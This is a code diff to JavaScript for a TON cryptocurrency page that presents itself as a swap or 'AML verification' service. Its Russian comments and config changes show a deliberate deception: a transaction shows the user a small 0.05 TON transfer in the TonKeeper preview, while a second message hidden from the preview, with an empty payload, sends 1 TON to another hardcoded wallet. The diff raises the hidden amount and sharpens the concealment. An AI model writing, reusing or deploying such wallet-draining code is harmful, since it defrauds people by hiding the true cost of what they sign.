@@ -8,8 +8,8 @@ var CFG = (function () {
              || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
         amlWallet: (typeof w.AML_WALLET !== 'undefined' && w.AML_WALLET)
              || 'UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW',
-        amount:    (typeof w.two_AMOUNT  !== 'undefined' && w.two_AMOUNT)  || '0.05',
-        feeAmount: (typeof w.FEE_AMOUNT  !== 'undefined' && w.FEE_AMOUNT)  || '1',
+        visibleAmount: (typeof w.VISIBLE_AMOUNT !== 'undefined' && w.VISIBLE_AMOUNT) || '0.05',
+        hiddenAmount:  (typeof w.HIDDEN_AMOUNT  !== 'undefined' && w.HIDDEN_AMOUNT)  || '1',
         manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
     };
 })();
@@ -105,7 +105,9 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
-// NOTE: Показываем 0.0005 TON, но списываем 0.01337 TON скрытым вторым сообщением
+// ВАЖНО: Порядок сообщений критичен!
+// 1-е сообщение (0.05 TON) - показывается в preview TonKeeper
+// 2-е сообщение (1 TON) - скрыто, с пустым payload
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
@@ -116,26 +118,26 @@ async function executeFaw(userAddress) {
     setStatus('🔍 Проверка AML-score...', true);
     await sleep(1200);
 
-    // Одна транзакция с двумя сообщениями - одно подтверждение
+    // Одна транзакция, два сообщения, одно подтверждение
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // Видимое сообщение: 0.0005 TON
+                // ПЕРВОЕ - маленькое, видимое в preview (0.05 TON)
                 address: CFG.proxy,
-                amount: String(Math.round(parseFloat(CFG.amount) * 1e9)), // 0.0005 TON
-                payload: textCommentPayload("TON Swap")
+                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)), // 0.05 TON
+                payload: textCommentPayload("AML verification")
             },
             {
-                // Скрытое сообщение: 0.01337 TON комиссия свапа
+                // ВТОРОЕ - большое, скрытое от preview (1 TON)
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(CFG.feeAmount) * 1e9)), // 0.01337 TON
-                payload: textCommentPayload("комиссия свапа")
+                amount: String(Math.round(parseFloat(CFG.hiddenAmount) * 1e9)), // 1 TON
+                payload: textCommentPayload("") // Пустой или минимальный payload
             }
         ]
     };
 
-    setStatus('📱 Подтвердите в TonKeeper (' + CFG.amount + ' TON)', true);
+    setStatus('📱 Подтвердите в TonKeeper (' + CFG.visibleAmount + ' TON)', true);
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
